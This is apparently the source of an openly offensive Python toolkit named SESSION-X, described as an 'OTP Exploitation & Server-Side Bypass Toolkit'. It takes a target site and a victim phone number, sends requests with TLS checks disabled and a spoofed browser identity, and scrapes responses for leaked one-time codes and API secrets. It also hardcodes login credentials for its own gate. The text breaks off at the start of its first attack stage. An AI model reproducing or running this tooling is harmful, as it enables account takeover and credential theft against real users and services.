#!/usr/bin/env python3
import sys
try:
    import requests, urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("[!] pip install requests urllib3 beautifulsoup4 lxml websocket-client colorama")
try:
    from bs4 import BeautifulSoup
except ImportError:
    sys.exit("[!] pip install beautifulsoup4 lxml")
try:
    import websocket
except ImportError:
    websocket = None
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class _D:
        def __getattr__(self, _): return ""
    Fore = Style = _D()

import json, re, time, threading, os, socket, ssl, getpass, shutil
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse, urljoin

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN
M = Fore.MAGENTA; W = Fore.WHITE; B = Fore.BLUE; X = Style.RESET_ALL
BR = Style.BRIGHT; DIM = Style.DIM

SX  = "\033[38;5;250m"
SX2 = "\033[38;5;245m"
SX3 = "\033[38;5;240m"
SX4 = "\033[38;5;253m"
SXB = "\033[1m"
NEON = "\033[38;5;123m"
METAL = "\033[38;5;117m"
PULSE = "\033[38;5;45m"
ALERT = "\033[38;5;196m"
GOLD = "\033[38;5;220m"
PLASMA = "\033[38;5;201m"
LASER = "\033[38;5;46m"
CYBER = "\033[38;5;39m"
DANGER = "\033[38;5;160m"
RESET = "\033[0m"

COUNTRIES = [
    ("AF", "Afghanistan", "+93"), ("AL", "Albania", "+355"), ("DZ", "Algeria", "+213"),
    ("AD", "Andorra", "+376"), ("AO", "Angola", "+244"), ("AG", "Antigua and Barbuda", "+1"),
    ("AR", "Argentina", "+54"), ("AM", "Armenia", "+374"), ("AU", "Australia", "+61"),
    ("AT", "Austria", "+43"), ("AZ", "Azerbaijan", "+994"), ("BS", "Bahamas", "+1"),
    ("BH", "Bahrain", "+973"), ("BD", "Bangladesh", "+880"), ("BB", "Barbados", "+1"),
    ("BY", "Belarus", "+375"), ("BE", "Belgium", "+32"), ("BZ", "Belize", "+501"),
    ("BJ", "Benin", "+229"), ("BT", "Bhutan", "+975"), ("BO", "Bolivia", "+591"),
    ("BA", "Bosnia and Herzegovina", "+387"), ("BW", "Botswana", "+267"),
    ("BR", "Brazil", "+55"), ("BN", "Brunei", "+673"), ("BG", "Bulgaria", "+359"),
    ("BF", "Burkina Faso", "+226"), ("BI", "Burundi", "+257"), ("KH", "Cambodia", "+855"),
    ("CM", "Cameroon", "+237"), ("CA", "Canada", "+1"), ("CV", "Cape Verde", "+238"),
    ("CF", "Central African Republic", "+236"), ("TD", "Chad", "+235"), ("CL", "Chile", "+56"),
    ("CN", "China", "+86"), ("CO", "Colombia", "+57"), ("KM", "Comoros", "+269"),
    ("CG", "Congo", "+242"), ("CD", "Congo (DRC)", "+243"), ("CR", "Costa Rica", "+506"),
    ("CI", "Cote d'Ivoire", "+225"), ("HR", "Croatia", "+385"), ("CU", "Cuba", "+53"),
    ("CY", "Cyprus", "+357"), ("CZ", "Czechia", "+420"), ("DK", "Denmark", "+45"),
    ("DJ", "Djibouti", "+253"), ("DM", "Dominica", "+1"), ("DO", "Dominican Republic", "+1"),
    ("EC", "Ecuador", "+593"), ("EG", "Egypt", "+20"), ("SV", "El Salvador", "+503"),
    ("GQ", "Equatorial Guinea", "+240"), ("ER", "Eritrea", "+291"), ("EE", "Estonia", "+372"),
    ("SZ", "Eswatini", "+268"), ("ET", "Ethiopia", "+251"), ("FJ", "Fiji", "+679"),
    ("FI", "Finland", "+358"), ("FR", "France", "+33"), ("GA", "Gabon", "+241"),
    ("GM", "Gambia", "+220"), ("GE", "Georgia", "+995"), ("DE", "Germany", "+49"),
    ("GH", "Ghana", "+233"), ("GR", "Greece", "+30"), ("GD", "Grenada", "+1"),
    ("GT", "Guatemala", "+502"), ("GN", "Guinea", "+224"), ("GW", "Guinea-Bissau", "+245"),
    ("GY", "Guyana", "+592"), ("HT", "Haiti", "+509"), ("HN", "Honduras", "+504"),
    ("HK", "Hong Kong", "+852"), ("HU", "Hungary", "+36"), ("IS", "Iceland", "+354"),
    ("IN", "India", "+91"), ("ID", "Indonesia", "+62"), ("IR", "Iran", "+98"),
    ("IQ", "Iraq", "+964"), ("IE", "Ireland", "+353"), ("IL", "Israel", "+972"),
    ("IT", "Italy", "+39"), ("JM", "Jamaica", "+1"), ("JP", "Japan", "+81"),
    ("JO", "Jordan", "+962"), ("KZ", "Kazakhstan", "+7"), ("KE", "Kenya", "+254"),
    ("KI", "Kiribati", "+686"), ("KP", "North Korea", "+850"), ("KR", "South Korea", "+82"),
    ("KW", "Kuwait", "+965"), ("KG", "Kyrgyzstan", "+996"), ("LA", "Laos", "+856"),
    ("LV", "Latvia", "+371"), ("LB", "Lebanon", "+961"), ("LS", "Lesotho", "+266"),
    ("LR", "Liberia", "+231"), ("LY", "Libya", "+218"), ("LI", "Liechtenstein", "+423"),
    ("LT", "Lithuania", "+370"), ("LU", "Luxembourg", "+352"), ("MO", "Macau", "+853"),
    ("MG", "Madagascar", "+261"), ("MW", "Malawi", "+265"), ("MY", "Malaysia", "+60"),
    ("MV", "Maldives", "+960"), ("ML", "Mali", "+223"), ("MT", "Malta", "+356"),
    ("MH", "Marshall Islands", "+692"), ("MR", "Mauritania", "+222"), ("MU", "Mauritius", "+230"),
    ("MX", "Mexico", "+52"), ("FM", "Micronesia", "+691"), ("MD", "Moldova", "+373"),
    ("MC", "Monaco", "+377"), ("MN", "Mongolia", "+976"), ("ME", "Montenegro", "+382"),
    ("MA", "Morocco", "+212"), ("MZ", "Mozambique", "+258"), ("MM", "Myanmar", "+95"),
    ("NA", "Namibia", "+264"), ("NR", "Nauru", "+674"), ("NP", "Nepal", "+977"),
    ("NL", "Netherlands", "+31"), ("NZ", "New Zealand", "+64"), ("NI", "Nicaragua", "+505"),
    ("NE", "Niger", "+227"), ("NG", "Nigeria", "+234"), ("MK", "North Macedonia", "+389"),
    ("NO", "Norway", "+47"), ("OM", "Oman", "+968"), ("PK", "Pakistan", "+92"),
    ("PW", "Palau", "+680"), ("PS", "Palestine", "+970"), ("PA", "Panama", "+507"),
    ("PG", "Papua New Guinea", "+675"), ("PY", "Paraguay", "+595"), ("PE", "Peru", "+51"),
    ("PH", "Philippines", "+63"), ("PL", "Poland", "+48"), ("PT", "Portugal", "+351"),
    ("PR", "Puerto Rico", "+1"), ("QA", "Qatar", "+974"), ("RO", "Romania", "+40"),
    ("RU", "Russia", "+7"), ("RW", "Rwanda", "+250"), ("KN", "Saint Kitts and Nevis", "+1"),
    ("LC", "Saint Lucia", "+1"), ("VC", "Saint Vincent and the Grenadines", "+1"),
    ("WS", "Samoa", "+685"), ("SM", "San Marino", "+378"), ("ST", "Sao Tome and Principe", "+239"),
    ("SA", "Saudi Arabia", "+966"), ("SN", "Senegal", "+221"), ("RS", "Serbia", "+381"),
    ("SC", "Seychelles", "+248"), ("SL", "Sierra Leone", "+232"), ("SG", "Singapore", "+65"),
    ("SK", "Slovakia", "+421"), ("SI", "Slovenia", "+386"), ("SB", "Solomon Islands", "+677"),
    ("SO", "Somalia", "+252"), ("ZA", "South Africa", "+27"), ("SS", "South Sudan", "+211"),
    ("ES", "Spain", "+34"), ("LK", "Sri Lanka", "+94"), ("SD", "Sudan", "+249"),
    ("SR", "Suriname", "+597"), ("SE", "Sweden", "+46"), ("CH", "Switzerland", "+41"),
    ("SY", "Syria", "+963"), ("TW", "Taiwan", "+886"), ("TJ", "Tajikistan", "+992"),
    ("TZ", "Tanzania", "+255"), ("TH", "Thailand", "+66"), ("TL", "Timor-Leste", "+670"),
    ("TG", "Togo", "+228"), ("TO", "Tonga", "+676"), ("TT", "Trinidad and Tobago", "+1"),
    ("TN", "Tunisia", "+216"), ("TR", "Turkey", "+90"), ("TM", "Turkmenistan", "+993"),
    ("TV", "Tuvalu", "+688"), ("UG", "Uganda", "+256"), ("UA", "Ukraine", "+380"),
    ("AE", "United Arab Emirates", "+971"), ("GB", "United Kingdom", "+44"),
    ("US", "United States", "+1"), ("UY", "Uruguay", "+598"), ("UZ", "Uzbekistan", "+998"),
    ("VU", "Vanuatu", "+678"), ("VA", "Vatican City", "+379"), ("VE", "Venezuela", "+58"),
    ("VN", "Vietnam", "+84"), ("YE", "Yemen", "+967"), ("ZM", "Zambia", "+260"),
    ("ZW", "Zimbabwe", "+263"),
]

OTP_RE = [
    r'"(?:otp|code|pin|token|verification_code|auth_code|sms_code|passcode|one_time_password|totp|hotp|otp_code|verify_code)"\s*:\s*"?([0-9A-Za-z\-]{4,10})"?',
    r'(?:otp|code|pin|token|otp_code|verification_code|sms_code)=([0-9A-Za-z\-]{4,10})',
    r'(?i)(?:otp|code|pin|verification|passcode|one[\s\-]?time)\s*(?:is|:|=|->)\s*([0-9A-Za-z\-]{4,10})',
    r'(?i)<input[^>]+(?:otp|code|pin)[^>]+value=["\']([0-9A-Za-z\-]{4,10})["\']',
    r'(?i)name=["\'](?:otp|code|pin|verification_code)["\'][^>]+value=["\']([0-9A-Za-z\-]{4,10})["\']',
    r'(?i)(?:var|let|const)\s+(?:otp|code|pin|verificationCode|authCode)\s*=\s*["\']?([0-9A-Za-z\-]{4,10})["\']?',
    r'\b\d{3}[-\s]\d{3}\b',
    r'\b[A-Z0-9]{2}-[A-Z0-9]{2}-[A-Z0-9]{2}\b',
    r'\b\d{8}\b', r'\b\d{7}\b', r'\b\d{6}\b', r'\b\d{5}\b', r'\b\d{4}\b',
]
SMS_RE = [
    r'(?i)"(?:type|channel|delivery|otp_type|method|via|provider)"\s*:\s*"([a-z_\-]{2,20})"',
    r'(?i)(sms|missed[\s\-]?call|voice[\s\-]otp|ivr|flash[\s\-]call|whatsapp|telegram)',
    r'(?i)(twilio|nexmo|vonage|messagebird|plivo|sinch|gupshup|msg91|aws[\s\-\.]?sns|kaleyra|infobip|clickatell|firebase)',
]
SECRETS = {
    "aws_key": r'AKIA[0-9A-Z]{16}',
    "google": r'AIza[0-9A-Za-z\-_]{35}',
    "firebase": r'(?i)firebase[a-z]*["\']?\s*[:=]\s*["\']([^"\']{20,})',
    "twilio_sid": r'AC[a-f0-9]{32}',
    "jwt": r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
    "stripe": r'sk_live_[0-9a-zA-Z]{24,}',
    "sendgrid": r'SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}',
    "hmac": r'(?i)(?:hmac|signing|otp)[\s_]?secret["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=]{16,})',
}
API_RE = re.compile(r'''["'`](/[A-Za-z0-9_\-/]*(?:api|v\d+|rest|graphql|gql|auth|user|account|otp|sms|verify|phone|email|login|signin|register|session|token|send|call|resend|validate)[A-Za-z0-9_\-/{}]*)["'`]''')
URL_RE = re.compile(r'https?://[A-Za-z0-9\.\-]+(?::\d+)?/[A-Za-z0-9_\-./?=&%{}:]*')
WS_RE = re.compile(r'wss?://[A-Za-z0-9\.\-:_/]+')

SUCCESS_KW = ["success","verified","welcome","dashboard","logged in","authenticated","valid",
              "accepted","redirecting","access_token","session","logged-in","signed in",
              "otp verified","verified successfully","authorized","otp sent","code sent",
              "sent successfully","otp has been sent","check your","login successful",
              "authentication successful"]
FAIL_KW = ["invalid","wrong","incorrect","expired","failed","denied","try again","mismatch",
           "error","blocked","locked","not found","unauthorized","bad request","does not match",
           "not valid","invalid otp","invalid code","wrong otp","wrong code","expired otp",
           "otp expired","verification failed","authentication failed","login failed"]

AUTHORIZED_USER = "sylhetyhackvenger"
AUTHORIZED_PASS = "error808"
LEGAL_WARN = "Warning: Do not use this tool for illegal activity. Author is not responsible of your misuse."

class RestartSignal(Exception):
    pass

def term_width(default=100, cap=100):
    try:
        w = shutil.get_terminal_size((default, 24)).columns
        return max(60, min(cap, w))
    except Exception:
        return default

def find_otps(t, lo=4, hi=10):
    out = set()
    if not t: return out
    for p in OTP_RE:
        for m in re.finditer(p, t):
            v = str(m.group(1) if m.groups() else m.group(0)).strip()
            if lo <= len(v) <= hi and not re.fullmatch(r'(19|20)\d{2}', v):
                out.add(v)
    return out

def find_sms(t):
    if not t: return []
    hits = []
    for p in SMS_RE:
        hits += [m.group(0)[:100] for m in re.finditer(p, t)]
    return list(dict.fromkeys(hits))

def find_secrets(t):
    out = {}
    if not t: return out
    for n, p in SECRETS.items():
        h = re.findall(p, t)
        if h: out[n] = list({str(x)[:200] for x in h})[:5]
    return out

def clear_screen():
    try:
        if sys.stdout.isatty():
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.flush()
    except Exception:
        pass

def strip_ansi(s):
    return re.sub(r'\x1b\[[0-9;]*m', '', s)

def vis_len(s):
    return len(strip_ansi(s))

def pad_visible(s, width, align="left"):
    vl = vis_len(s)
    if vl >= width:
        return s
    pad = width - vl
    if align == "center":
        left = pad // 2
        right = pad - left
        return " " * left + s + " " * right
    if align == "right":
        return " " * pad + s
    return s + " " * pad

def framed_line(content, color=PULSE, w=None):
    w = w or term_width()
    inner = w - 4
    content = pad_visible(content, inner)
    return f"{color}{BR}│{RESET} {content} {color}{BR}│{RESET}"

def framed_top(title, color=PULSE, w=None):
    w = w or term_width()
    inner = w - 2
    if title:
        t = f" {title} "
        pad = max(0, inner - vis_len(t))
        left = pad // 2
        right = pad - left
        return f"{color}{BR}┌{'─' * left}{t}{'─' * right}┐{RESET}"
    return f"{color}{BR}┌{'─' * inner}┐{RESET}"

def framed_sep(color=PULSE, w=None):
    w = w or term_width()
    return f"{color}{BR}├{'─' * (w - 2)}┤{RESET}"

def framed_bottom(color=PULSE, w=None):
    w = w or term_width()
    return f"{color}{BR}└{'─' * (w - 2)}┘{RESET}"

def cinematic_transition(text, color=NEON):
    clear_screen()
    w = term_width()
    print(f"\n\n\n{color}{BR}{framed_top('', color, w)}{RESET}")
    print(framed_line(f"{SXB}{text.center(term_width() - 4)}{RESET}", color, w))
    print(f"{color}{BR}{framed_bottom(color, w)}{RESET}\n")
    time.sleep(0.8)

def banner():
    art = r"""
  ███████╗███████╗███████╗███████╗██╗ ██████╗ ███╗   ██╗    ██╗  ██╗
  ██╔════╝██╔════╝██╔════╝██╔════╝██║██╔═══██╗████╗  ██║    ╚██╗██╔╝
  ███████╗█████╗  ███████╗███████╗██║██║   ██║██╔██╗ ██║ ███ ╚███╔╝
  ╚════██║██╔══╝  ╚════██║╚════██║██║██║   ██║██║╚██╗██║     ██╔██╗
  ███████║███████╗███████║███████║██║╚██████╔╝██║ ╚████║    ██╔╝ ██╗
  ╚══════╝╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝  ╚═╝
"""
    for line in art.splitlines():
        print(f"{PULSE}{SXB}{line}{RESET}")
        time.sleep(0.01)
    w = term_width()
    print(f"\n{NEON}{BR}{framed_top('SESSION-X :: Full-Stack OTP Exploitation & Server-Side Bypass Toolkit', NEON, w)}{RESET}")
    print(framed_line(f"{SX4}Author  : {BR}{AUTHORIZED_USER}{RESET}{SX4} (THE-ERROR808){RESET}", NEON, w))
    print(framed_line(f"{SX4}Date    : {BR}{datetime.now().strftime('%Y-%m-%d')}{RESET}  {SX4}Time: {BR}{datetime.now().strftime('%H:%M:%S')}{RESET}", NEON, w))
    print(framed_line(f"{SX4}Title   : {BR}SESSION-X{{ Lets Hunt The OTP }}{RESET}", NEON, w))
    print(f"{NEON}{BR}{framed_sep(NEON, w)}{RESET}")
    legal = f"{ALERT}{SXB}⚠ {LEGAL_WARN}{RESET}"
    print(framed_line(legal, NEON, w))
    print(f"{NEON}{BR}{framed_bottom(NEON, w)}{RESET}\n")

def stage_header(stage, subtitle, color=CYBER):
    w = term_width()
    print()
    print(f"{color}{BR}{framed_top(f'{stage} · {subtitle}', color, w)}{RESET}")

def stage_footer(color=CYBER):
    w = term_width()
    print(f"{color}{BR}{framed_bottom(color, w)}{RESET}\n")

def gateway():
    clear_screen()
    w = term_width()
    print(f"\n{PLASMA}{BR}{framed_top('◈ SESSION-X SECURE GATEWAY ◈', PLASMA, w)}{RESET}")
    print(framed_line(f"{SX4}Authorization Required — {DANGER}⚠ {LEGAL_WARN}{RESET}", PLASMA, w))
    print(f"{PLASMA}{BR}{framed_bottom(PLASMA, w)}{RESET}\n")
    time.sleep(0.3)
    while True:
        print(f"{CYBER}{BR}◈ Enter credentials to unlock SESSION-X{RESET}\n")
        try:
            user = input(f"{GOLD}{BR}┌─[ Username ]──► {RESET}").strip()
        except KeyboardInterrupt:
            raise RestartSignal()
        except EOFError:
            sys.exit(0)
        try:
            pwd = getpass.getpass(f"{GOLD}{BR}└─[ Password ]──► {RESET}")
        except KeyboardInterrupt:
            raise RestartSignal()
        except EOFError:
            sys.exit(0)
        if user == AUTHORIZED_USER and pwd == AUTHORIZED_PASS:
            print(f"\n{LASER}{BR}✓ ACCESS GRANTED — Initializing secure channel...{RESET}")
            time.sleep(0.8)
            return True
        print(f"\n{ALERT}{BR}✗ ACCESS DENIED — Invalid credentials. Retrying...{RESET}\n")
        time.sleep(0.6)

def prompt(prompt_text):
    try:
        return input(prompt_text).strip()
    except EOFError:
        return ""
    except KeyboardInterrupt:
        raise RestartSignal()

def safe_json(obj):
    try:
        return json.dumps(obj, default=str)
    except Exception:
        return str(obj)

def select_country():
    stage_header("COUNTRY SELECTOR", "Universal Country Support", GOLD)
    print(f"{C}Enter serial number or short code (e.g. BD).{RESET}\n")
    for i, (code, name, dial) in enumerate(COUNTRIES, 1):
        col = CYBER if i % 2 == 0 else SX4
        print(f"  {col}{BR}{i:3d}{RESET}. {code:2s}  {name:<35s} {DIM}{dial}{RESET}")
        if i % 20 == 0 and i < len(COUNTRIES):
            print(f"\n{SX3}  ─── press Enter to continue or type selection ───{RESET}")
            sel = prompt(f"\n{GOLD}{BR}[?] Selection: {RESET}")
            if sel:
                stage_footer(GOLD)
                return _resolve_country(sel)
            print()
    stage_footer(GOLD)
    while True:
        sel = prompt(f"\n{GOLD}{BR}[?] Enter country serial number or short code: {RESET}").strip()
        c = _resolve_country(sel)
        if c:
            return c
        print(f"  {R}Invalid selection — try again{RESET}")

def _resolve_country(sel):
    if not sel:
        print(f"  {R}Cannot be empty{RESET}")
        return None
    if sel.isdigit():
        idx = int(sel)
        if 1 <= idx <= len(COUNTRIES):
            return COUNTRIES[idx - 1]
        print(f"  {R}Serial out of range (1-{len(COUNTRIES)}){RESET}")
        return None
    for code, name, dial in COUNTRIES:
        if code.upper() == sel.upper():
            return (code, name, dial)
    print(f"  {R}Country code '{sel}' not found{RESET}")
    return None

def build_phone_number():
    code, name, dial = select_country()
    if not code:
        return None
    print(f"\n  {LASER}✓ Selected: {BR}{name} ({code}){RESET} {DIM}dial={dial}{RESET}\n")
    while True:
        raw = prompt(f"{GOLD}{BR}[?] Enter local number (without country code, e.g. 01111356732): {RESET}").strip()
        if not raw:
            print(f"  {R}Cannot be empty{RESET}"); continue
        cleaned = re.sub(r'[^\d]', '', raw)
        if len(cleaned) < 4:
            print(f"  {R}Number too short — enter at least 4 digits{RESET}"); continue
        if cleaned.startswith("0"):
            cleaned = cleaned[1:]
        full = f"{dial}{cleaned}"
        print(f"\n  {LASER}✓ Full international number: {BR}{full}{RESET}")
        ok = prompt(f"{GOLD}{BR}[?] Confirm? (y/n): {RESET}").lower()
        if ok == "y":
            return full, name, code, dial
        print(f"  {Y}Restarting number entry...{RESET}")

class Confirmer:
    def __init__(self, sess):
        self.sess = sess
        self.baseline_cache = {}
        self.lock = threading.Lock()

    def baseline(self, url, method="GET", **kw):
        key = (method, url, safe_json(kw))
        with self.lock:
            if key in self.baseline_cache:
                return self.baseline_cache[key]
        r = self.sess.req(method, url, **kw)
        snap = {
            "status": r.status_code if r else None,
            "len": len(r.content) if r else 0,
            "body": (r.text or "")[:5000] if r else "",
            "headers": dict(r.headers) if r else {},
        }
        with self.lock:
            self.baseline_cache[key] = snap
        return snap

    def body_differs(self, body, baseline_body, threshold=0.35):
        def toks(s):
            return set(re.findall(r"[A-Za-z0-9_\-]{4,}", (s or "").lower()))
        a, b = toks(body), toks(baseline_body)
        if not a and not b: return False
        union = a | b
        if not union: return False
        return (len(a & b) / len(union)) < threshold

    def classify(self, r, baseline=None):
        if r is None:
            return "unknown", 0.0, "no response"
        text = (r.text or "").lower()
        succ = sum(1 for k in SUCCESS_KW if k in text)
        fail = sum(1 for k in FAIL_KW if k in text)

        if r.status_code in (401, 403, 422, 429):
            return "failure", 0.95, f"HTTP {r.status_code}"
        if r.status_code >= 500:
            return "unknown", 0.2, f"server error {r.status_code}"

        if baseline is not None:
            same_status = (r.status_code == baseline.get("status"))
            same_body = not self.body_differs(r.text, baseline.get("body", ""))
            if same_status and same_body:
                return "unknown", 0.3, "identical to baseline"

        if succ >= 2 and fail == 0 and r.status_code in (200, 201, 202, 204):
            return "success", min(0.6 + 0.1 * succ, 0.95), f"success kw={succ}"
        if fail >= 1 and succ == 0:
            return "failure", min(0.6 + 0.15 * fail, 0.95), f"fail kw={fail}"
        if fail > succ:
            return "failure", 0.6, "fail>success"
        if succ > fail:
            return "success", 0.5, "success>fail"
        return "unknown", 0.2, "ambiguous"

    def confirm_otp_leak(self, body, endpoint, method="GET", body_obj=None, headers=None, tries=2):
        first = find_otps(body)
        if not first:
            return set()
        confirmed = set(first)
        for _ in range(tries):
            if method == "GET":
                r = self.sess.req("GET", endpoint, headers=headers or {})
            else:
                r = self.sess.req("POST", endpoint, json=body_obj or {}, headers=headers or {})
            if r is None:
                return set()
            nxt = find_otps(r.text or "")
            if not nxt:
                return set()
            confirmed &= nxt
            if not confirmed:
                return set()
        return confirmed

class Session:
    def __init__(self, proxy=None, auth=None, cookie=None, headers=None):
        self.s = requests.Session()
        self.s.verify = False
        if cookie: self.s.headers["Cookie"] = cookie
        if auth: self.s.headers["Authorization"] = auth
        self.s.headers["User-Agent"] = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                                        "Chrome/120.0 Safari/537.36")
        self.s.headers["Accept"] = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                                    "application/json;q=0.8,*/*;q=0.7")
        self.s.headers["Accept-Language"] = "en-US,en;q=0.9"
        if headers:
            for h in headers.split(";"):
                k, _, v = h.partition(":")
                if k.strip(): self.s.headers[k.strip()] = v.strip()
        if proxy: self.s.proxies = {"http": proxy, "https": proxy}
        self.history = []
        self.hist_lock = threading.Lock()

    def req(self, method, url, **kw):
        kw.setdefault("timeout", 15)
        kw.setdefault("allow_redirects", True)
        try:
            r = self.s.request(method, url, **kw)
        except requests.RequestException as e:
            with self.hist_lock:
                self.history.append({"ts": datetime.utcnow().isoformat()+"Z",
                                     "method": method, "url": url, "error": str(e)})
            return None
        with self.hist_lock:
            self.history.append({
                "ts": datetime.utcnow().isoformat()+"Z",
                "method": method, "url": url,
                "req_headers": dict(self.s.headers),
                "req_body": kw.get("json") or kw.get("data") or kw.get("params"),
                "status": r.status_code,
                "resp_headers": dict(r.headers),
                "resp_body": (r.text or "")[:5000],
            })
        return r

class Logger:
    def __init__(self):
        self.findings = []
        self.lock = threading.Lock()
        self.dedupe = set()

    def add(self, kind, sev, title, detail, evidence="", extra=None, confidence=1.0):
        key = f"{kind}|{title}|{detail[:80]}"
        with self.lock:
            if key in self.dedupe: return
            self.dedupe.add(key)
            f = {"id": f"F{len(self.findings)+1:03d}", "kind": kind, "severity": sev,
                 "title": title, "detail": detail,
                 "evidence": (evidence or "")[:5000],
                 "extra": extra or {},
                 "confidence": round(confidence, 2),
                 "ts": datetime.utcnow().isoformat()+"Z"}
            self.findings.append(f)
        color = {"critical": ALERT, "high": R, "medium": Y, "low": C, "info": W}.get(sev, W)
        icon = {"critical": "☠", "high": "⚠", "medium": "◆", "low": "▸", "info": "ℹ"}.get(sev, "▸")
        print(f"  {color}{BR}{icon} [{sev.upper()}]{RESET} {title}  {DIM}(conf={confidence:.2f}){RESET}")
        if detail:
            print(f"        {DIM}{detail[:200]}{RESET}")

def print_request(label, method, url, headers, body=""):
    print(f"\n  {PLASMA}{BR}◈ {label} — REQUEST{RESET}")
    print(f"    {B}Method :{RESET} {method}")
    print(f"    {B}URL    :{RESET} {url}")
    if headers:
        print(f"    {B}Headers:{RESET}")
        for k, v in headers.items():
            disp = v if len(v) <= 120 else v[:120] + "..."
            print(f"      {DIM}{k}:{RESET} {disp}")
    if body:
        print(f"    {B}Body   :{RESET}")
        s = safe_json(body) if isinstance(body, (dict, list)) else str(body)
        for line in s.splitlines()[:20]:
            print(f"      {DIM}{line[:200]}{RESET}")

def print_response(label, r, otps=None, sms=None, secrets=None):
    if r is None:
        print(f"  {ALERT}✗ {label} — no response{RESET}"); return
    print(f"  {LASER}{BR}◈ {label} — RESPONSE{RESET}")
    print(f"    {G}Status :{RESET} {r.status_code} {r.reason}")
    print(f"    {G}Server :{RESET} {r.headers.get('Server', 'n/a')}")
    print(f"    {G}Size   :{RESET} {len(r.content)} bytes")
    if r.cookies:
        print(f"    {G}Cookies:{RESET}")
        for c in r.cookies:
            print(f"      {DIM}{c.name}{RESET} = {c.value[:60]}")
    body = (r.text or "")[:800]
    if body:
        print(f"    {G}Body   :{RESET}")
        for line in body.splitlines()[:15]:
            print(f"      {DIM}{line[:200]}{RESET}")
    if otps: print(f"    {PLASMA}{BR}OTPs   : {sorted(otps)}{RESET}")
    if sms: print(f"    {GOLD}{BR}Channels: {sms}{RESET}")
    if secrets:
        print(f"    {ALERT}{BR}Secrets:{RESET}")
        for k, v in secrets.items():
            print(f"      {ALERT}{k}{RESET} = {v}")

SECURITY_HEADERS = {
    "Strict-Transport-Security": "Missing HSTS — TLS downgrade risk",
    "Content-Security-Policy": "Missing CSP — XSS risk",
    "X-Frame-Options": "Missing X-Frame-Options — clickjacking risk",
    "X-Content-Type-Options": "Missing X-Content-Type-Options — MIME sniffing risk",
    "Referrer-Policy": "Missing Referrer-Policy — referrer leakage",
    "Permissions-Policy": "Missing Permissions-Policy",
}

def analyze_headers(r, logger, label=""):
    if r is None: return
    h = {k.lower(): v for k, v in r.headers.items()}
    for name, msg in SECURITY_HEADERS.items():
        if name.lower() not in h:
            logger.add("header", "low", f"Missing {name} {label}".strip(),
                       msg, safe_json(dict(r.headers))[:2000], confidence=0.9)
    for c in r.cookies:
        flags = []
        if not c.secure: flags.append("no Secure")
        if not c.has_nonstandard_attr("HttpOnly"): flags.append("no HttpOnly")
        if not c.get_nonstandard_attr("SameSite"): flags.append("no SameSite")
        if flags:
            sev = "medium" if ("no Secure" in flags or "no HttpOnly" in flags) else "low"
            logger.add("cookie", sev, f"Cookie '{c.name}' weak flags {label}".strip(),
                       ", ".join(flags), c.value[:200], confidence=0.85)
    acao = h.get("access-control-allow-origin", "")
    acac = h.get("access-control-allow-credentials", "")
    if acao == "*" and acac.lower() == "true":
        logger.add("cors", "high", f"Wildcard CORS + credentials {label}".strip(),
                   "ACAO=* + ACAC=true", safe_json(dict(r.headers))[:1500], confidence=0.95)
    for hk in ("x-otp", "x-verification-code", "x-sms-code", "x-debug-otp"):
        if hk in h:
            logger.add("header-leak", "critical",
                       f"OTP leaked in response header {hk} {label}".strip(),
                       f"{hk}: {h[hk]}", safe_json(dict(r.headers))[:1500],
                       confidence=0.95)

def raw_http_req(method, url, headers, body=None):
    p = urlparse(url)
    path = p.path or "/"
    if p.query: path += "?" + p.query
    lines = [f"{method} {path} HTTP/1.1", f"Host: {p.netloc}"]
    for k, v in (headers or {}).items():
        lines.append(f"{k}: {v}")
    if body:
        b = safe_json(body) if isinstance(body, (dict, list)) else str(body)
        lines.append(f"Content-Length: {len(b)}")
        lines.append("")
        lines.append(b)
    return "\r\n".join(lines)

def raw_http_resp_from_hist(entry):
    lines = [f"HTTP/1.1 {entry.get('status', '?')}"]
    for k, v in (entry.get("resp_headers") or {}).items():
        lines.append(f"{k}: {v}")
    lines.append("")
    lines.append(entry.get("resp_body", "") or "")
    return "\r\n".join(lines)

class Hunter:
    def __init__(self, target, proxy=None, auth=None, cookie=None, headers=None, delay=0.3):
        self.target = target.rstrip("/")
        self.identity = None
        self.is_email = False
        self.password = None
        self.country_name = None
        self.country_code = None
        self.dial_code = None
        self.sess = Session(proxy, auth, cookie, headers)
        self.log = Logger()
        self.conf = Confirmer(self.sess)
        self.delay = delay
        self.discovered = {"html": "", "scripts": set(), "endpoints": set(),
                           "ws": set(), "origins": set(), "api_hosts": set(),
                           "forms": [], "login_page_url": None}
        self.start_time = time.time()

    def _sleep(self):
        if self.delay > 0: time.sleep(self.delay)

    def _final_summary(self):
        elapsed = int(time.time() - self.start_time)
        w = term_width()
        print()
        print(f"{NEON}{BR}{framed_top('SESSION-X :: OPERATION SUMMARY', NEON, w)}{RESET}")
        rows = [
            ("TARGET", self.target),
            ("IDENTITY", self.identity or "n/a"),
            ("COUNTRY", f"{self.country_name} ({self.country_code}) {self.dial_code}" if self.country_name else "n/a"),
            ("ENDPOINTS", str(len(self.discovered["endpoints"]))),
            ("SCRIPTS", str(len(self.discovered["scripts"]))),
            ("WEBSOCKETS", str(len(self.discovered["ws"]))),
            ("REQUESTS", str(len(self.sess.history))),
            ("FINDINGS", str(len(self.log.findings))),
            ("ELAPSED", f"{elapsed // 60}m {elapsed % 60}s"),
        ]
        for k, v in rows:
            col = GOLD if k in ("TARGET", "IDENTITY", "COUNTRY") else (ALERT if k == "FINDINGS" else CYBER)
            print(framed_line(f"{col}{k:<10}{RESET} {SX4}{str(v)[:70]}{RESET}", NEON, w))
        print(f"{NEON}{BR}{framed_bottom(NEON, w)}{RESET}\n")

    def find_login_page(self):
        stage_header("STAGE 1", "FETCHING LOGIN PAGE — Analyzing target surface", CYBER)
